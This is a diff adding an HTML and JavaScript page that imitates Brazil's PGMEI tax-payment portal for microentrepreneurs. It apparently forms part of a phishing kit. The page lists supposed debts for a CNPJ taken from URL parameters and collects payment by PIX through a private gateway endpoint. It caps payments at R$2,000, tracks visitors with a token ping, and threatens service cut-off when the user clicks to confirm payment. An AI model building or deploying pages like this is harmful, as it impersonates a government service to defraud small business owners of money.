@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="/debitos/css/debitos.css">
+    <link rel="stylesheet" href="/debitos/css/all.min.css">
+    <title>PG-ME-I - Programa</title>
+</head>
+<body>
+    <div class="div1">
+        <div class="top-bar"></div>
+        <div class="divalto">
+            <div class="badge">
+                <img src="/debitos/images/logo2.png" alt="Logo">
+                <a href="/">PGMEI</a>
+            </div>
+            <div class="subtitle">Programa Gerador de DAS do Microempreendedor Individual</div>
+        </div>
+        <div class="card-verde">
+            <div class="menu-esquerda">
+                <a href="#" id="menuHome"><i class="fa fa-home"></i> Início</a>
+                <a href="#" id="menuDas"><i class="fa fa-check-square"></i> Emitir Guia de Pagamento (DAS)</a>
+                <a href="#" id="menuExtrato"><i class="fa fa-lock"></i> Consulta Extrato/Pendências <i class="fa fa-caret-down"></i></a>
+            </div>
+            <div class="menu-direita">
+                <a href="/"><i class="fa fa-info-circle"></i> Ajuda</a>
+                <a href="/"><i class="fa fa-sign-out"></i> Sair</a>
+            </div>
+            <div class="menu-toggle"><i class="fa fa-bars"></i></div>
+            <div class="menu-mobile">
+                <a href="#" id="menuDasMob"><i class="fa fa-check-square"></i> Emitir Guia de Pagamento (DAS)</a>
+            </div>
+        </div>
+        <div class="card-whit">
+            <div><strong>CNPJ:</strong> <span id="displayCnpj">—</span></div>
+            <div><strong>Nome:</strong> <span id="displayNome">—</span></div>
+        </div>
+        <div class="card-quebra-branco"></div>
+        <div class="card-ano-cale">
+            <label for="ano">Informe o Ano-Calêndario:</label>
+            <select id="ano"></select>
+            <button class="btn-ok" id="buscarAno" type="button">Ok</button>
+        </div>
+        <div class="table-dividas-oculta" style="display:none;">
+            <div class="card-header-apuracao">Selecione o(s) período(s) de apuração:</div>
+            <div class="card-table-apuracao">
+                <table class="tabela-dividas">
+                    <thead>
+                        <tr>
+                            <th>Período de Apuração</th>
+                            <th>Apurado</th>
+                            <th>Benefício INSS</th>
+                            <th>Situação</th>
+                            <th>Principal</th>
+                            <th>Multa</th>
+                            <th>Juros</th>
+                            <th>Total</th>
+                            <th>Data de Vencimento</th>
+                            <th>Data de Acolhimento</th>
+                        </tr>
+                    </thead>
+                    <tbody id="tabela-body"></tbody>
+                </table>
+            </div>
+            <div class="card-buttons">
+                <p>Informe a data para pagamento do(s) DAS:
+                    <input type="text" class="diahj" id="dataPagamento" disabled>
+                </p>
+            </div>
+            <div class="card-buttons2">
+                <center>
+                    <strong>R$ <span id="totals">0,00</span></strong><br>
+                    <button id="pg" class="btnpg" type="button">Pagar Online</button>
+                </center>
+            </div>
+        </div>
+    </div>
+    <div class="div2">
+        <div class="div-sobre">
+            <div class="versao">Versão: 3.15.1</div>
+            <img src="/debitos/images/logo3.png" alt="Logo" class="logo">
+        </div>
+    </div>
+    <div id="modal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal()" title="Fechar">&times;</span>
+            <div class="modal-header">Pagamento DAS MEI</div>
+            <div class="modal-body">
+                <div class="payment-detail">
+                    <div>Valor: <span id="modalValor">R$ 0,00</span></div>
+                    <div>CNPJ: <span id="modalStatus"></span></div>
+                </div>
+                <div id="payment-pending">
+                    <p class="modal-text">Para efetuar o pagamento, escaneie o QRCODE abaixo:</p>
+                    <div class="qr-code">
+                        <img src="" alt="QR Code PIX" id="modalQRCode" width="200" height="200">
+                    </div>
+                    <p class="modal-text">Ou caso prefira, copie o código PIX abaixo:</p>
+                    <div class="pix-code">
+                        <input type="text" class="in" id="modalPixCode" value="" readonly>
+                    </div>
+                    <p class="modal-wait">
+                        <span class="loader-small"></span> Aguardando pagamento...
+                    </p>
+                </div>
+                <div id="payment-success" class="payment-success-box">
+                    <i class="fa fa-check-circle"></i>
+                    <h3>Pagamento Confirmado!</h3>
+                    <p>Seu pagamento foi processado com sucesso.</p>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button id="copy" type="button">Copiar <i class="fa fa-clipboard"></i></button>
+                <button id="paguei" type="button">Confirmar o pagamento <i class="fa fa-check"></i></button>
+            </div>
+        </div>
+    </div>
+    <script src="/js/api-client.js"></script>
+    <script>
+        const params = new URLSearchParams(location.search);
+        const TOKEN = params.get('token') || 'vias';
+        let CNPJ_DIGITS = (params.get('cnpj') || '').replace(/\D/g, '');
+        let NOME_EMPRE = params.get('nomeEmpre') || '';
+        let ANOS_COM_DEBITO = (params.get('anos') || '').split(',').map(a => parseInt(a.trim(), 10)).filter(a => a >= 2000);
+
+        function formatCnpj(d) {
+            if (d.length !== 14) return d;
+            return d.slice(0,2)+'.'+d.slice(2,5)+'.'+d.slice(5,8)+'/'+d.slice(8,12)+'-'+d.slice(12);
+        }
+
+        function mesExtenso(mesNum) {
+            const nomes = ["Janeiro","Fevereiro","Março","Abril","Maio","Junho","Julho","Agosto","Setembro","Outubro","Novembro","Dezembro"];
+            const [mes, ano] = mesNum.split("/");
+            return `${nomes[parseInt(mes,10)-1]}/${ano}`;
+        }
+
+        function buildMenuLinks() {
+            const qs = new URLSearchParams({ cnpj: CNPJ_DIGITS, nomeEmpre: NOME_EMPRE, token: TOKEN });
+            if (ANOS_COM_DEBITO.length) qs.set('anos', ANOS_COM_DEBITO.join(','));
+            const href = '/debitos?' + qs.toString();
+            ['menuHome','menuDas','menuExtrato','menuDasMob'].forEach(id => {
+                const el = document.getElementById(id);
+                if (el) el.href = href;
+            });
+        }
+
+        function fillYearSelect() {
+            const sel = document.getElementById('ano');
+            const yMax = new Date().getFullYear();
+            for (let y = 2021; y <= yMax; y++) {
+                const opt = document.createElement('option');
+                opt.value = y;
+                opt.textContent = y;
+                sel.appendChild(opt);
+            }
+            ANOS_COM_DEBITO.forEach(ano => {
+                for (const opt of sel.options) {
+                    if (parseInt(opt.value,10) === ano) {
+                        opt.textContent = ano + ' ●';
+                        opt.style.fontWeight = 'bold';
+                    }
+                }
+            });
+        }
+
+        function atualizarTotal() {
+            let total = 0;
+            document.querySelectorAll('.chkdebts:checked').forEach(chk => total += parseFloat(chk.dataset.valor));
+            document.getElementById('totals').innerText = total.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
+        }
+
+        async function buscarDebitos() {
+            const ano = document.getElementById('ano').value;
+            const btn = document.getElementById('buscarAno');
+            const oldText = btn.innerHTML;
+            btn.innerHTML = "<span class='loader'></span>";
+            btn.disabled = true;
+            try {
+                const data = await apiFetch(`/api/debts?lista=${encodeURIComponent(CNPJ_DIGITS+'|'+ano)}&token=${encodeURIComponent(TOKEN)}`);
+                const tbody = document.getElementById('tabela-body');
+                tbody.innerHTML = '';
+                if (data.debts && data.debts.length > 0) {
+                    data.debts.forEach(debt => {
+                        const tr = document.createElement('tr');
+                        tr.innerHTML = `
+                            <td><input class="chkdebts" type="checkbox" data-valor="${debt.valor_total.toString().replace(',','.')}" data-vencimento="${debt.vencimento}" /> ${mesExtenso(debt.geradoEm)}</td>
+                            <td>Sim</td><td><input type="checkbox" /></td>
+                            <td style="color:red;">${debt.status}</td>
+                            <td>R$ ${debt.valor_principal.toString().replace('.',',')}</td>
+                            <td>R$ ${debt.multa.toString().replace('.',',')}</td>
+                            <td>R$ ${debt.juros.toString().replace('.',',')}</td>
+                            <td>R$ ${debt.valor_total.toString().replace('.',',')}</td>
+                            <td>${debt.vencimento}</td>
+                            <td>${new Date().toLocaleDateString('pt-BR')}</td>`;
+                        tbody.appendChild(tr);
+                    });
+                    document.querySelectorAll('.chkdebts').forEach(chk => chk.addEventListener('change', atualizarTotal));
+                    atualizarTotal();
+                    document.querySelector('.table-dividas-oculta').style.display = 'block';
+                } else {
+                    alert('Nenhum débito encontrado para este ano.');
+                    document.querySelector('.table-dividas-oculta').style.display = 'none';
+                }
+            } catch (e) {
+                alert('Erro ao buscar débitos.');
+            } finally {
+                btn.innerHTML = oldText;
+                btn.disabled = false;
+            }
+        }
+
+        let pollInterval;
+        function openModal(valor, pixCode, qrcode, cnpj, id) {
+            document.getElementById('modalValor').innerText = 'R$ ' + valor.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
+            document.getElementById('modalPixCode').value = pixCode || '';
+            document.getElementById('modalQRCode').src = qrcode || '';
+            document.getElementById('modalStatus').innerText = cnpj;
+            document.getElementById('payment-pending').style.display = 'block';
+            document.getElementById('payment-success').style.display = 'none';
+            document.getElementById('modal').classList.add('modal-open');
+            if (id) startPolling(id);
+        }
+        function closeModal() {
+            document.getElementById('modal').classList.remove('modal-open');
+            stopPolling();
+        }
+        function startPolling(id) {
+            stopPolling();
+            pollInterval = setInterval(() => {
+                fetch('/api/check-pix?id=' + encodeURIComponent(id))
+                    .then(r => r.json())
+                    .then(d => { if (d.paid) { stopPolling(); document.getElementById('payment-pending').style.display='none'; document.getElementById('payment-success').style.display='block'; }});
+            }, 5000);
+        }
+        function stopPolling() { if (pollInterval) { clearInterval(pollInterval); pollInterval = null; } }
+
+        async function init() {
+            if (CNPJ_DIGITS.length !== 14) { location.href = '/'; return; }
+
+            if (!NOME_EMPRE || !ANOS_COM_DEBITO.length) {
+                const info = await apiFetch(`/api/cnpj?cnpj=${CNPJ_DIGITS}&token=${TOKEN}`);
+                if (info.nomeEmpresarial) NOME_EMPRE = info.nomeEmpresarial;
+                if (info.anos && info.anos.length) ANOS_COM_DEBITO = info.anos.map(Number);
+            }
+
+            const CNPJ_FMT = formatCnpj(CNPJ_DIGITS);
+            document.getElementById('displayCnpj').textContent = CNPJ_FMT;
+            document.getElementById('displayNome').textContent = NOME_EMPRE;
+            document.getElementById('dataPagamento').value = new Date().toLocaleDateString('pt-BR');
+            buildMenuLinks();
+            fillYearSelect();
+
+            const anoPref = ANOS_COM_DEBITO.length ? String(Math.max(...ANOS_COM_DEBITO)) : '';
+            if (anoPref) {
+                document.getElementById('ano').value = anoPref;
+                await buscarDebitos();
+            }
+
+            document.querySelector('.menu-toggle').addEventListener('click', () => document.querySelector('.card-verde').classList.toggle('expanded'));
+            document.getElementById('buscarAno').addEventListener('click', buscarDebitos);
+
+            function parseTotalReais() {
+                const txt = document.getElementById('totals').innerText.trim();
+                const s = txt.replace(/\./g, '').replace(',', '.');
+                return parseFloat(s) || 0;
+            }
+
+            document.getElementById('pg').addEventListener('click', async function () {
+                const total = parseTotalReais();
+                if (total <= 0) { alert('Ops, selecione uma fatura antes!'); return; }
+                if (total > 2000) {
+                    alert('Valor acima de R$ 2.000. Verifique as parcelas selecionadas.');
+                    return;
+                }
+                const centavos = Math.round(total * 100);
+                const btn = this;
+                const old = btn.innerHTML;
+                btn.innerHTML = "<span class='loader'></span>";
+                btn.disabled = true;
+                try {
+                    const data = await apiFetch('/api/pix', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            amount_centavos: centavos,
+                            cnpj: CNPJ_DIGITS,
+                            name: NOME_EMPRE
+                        })
+                    });
+                    if (data.pixLink) {
+                        openModal(total, data.pixLink, data.qrcode || '', CNPJ_FMT, data.id);
+                    } else {
+                        alert(data.error || 'Enki não retornou código PIX.');
+                    }
+                } catch (e) {
+                    console.error('PIX error:', e);
+                    alert(e.message || 'Erro ao gerar PIX.');
+                }
+                finally { btn.innerHTML = old; btn.disabled = false; }
+            });
+
+            document.getElementById('copy').addEventListener('click', function () {
+                const text = document.getElementById('modalPixCode').value;
+                navigator.clipboard.writeText(text).then(() => {
+                    this.innerHTML = "Copiado! <i class='fa fa-check'></i>";
+                    setTimeout(() => { this.innerHTML = 'Copiar <i class="fa fa-clipboard"></i>'; }, 3000);
+                });
+            });
+
+            document.getElementById('paguei').addEventListener('click', () => {
+                alert('Seu pagamento está em análise. Caso não efetue, seu serviço será cortado!');
+            });
+
+            setInterval(() => fetch('/api/ping?token=' + TOKEN).catch(() => {}), 20000);
+        }
+
+        init();
+    </script>
+</body>
+</html>
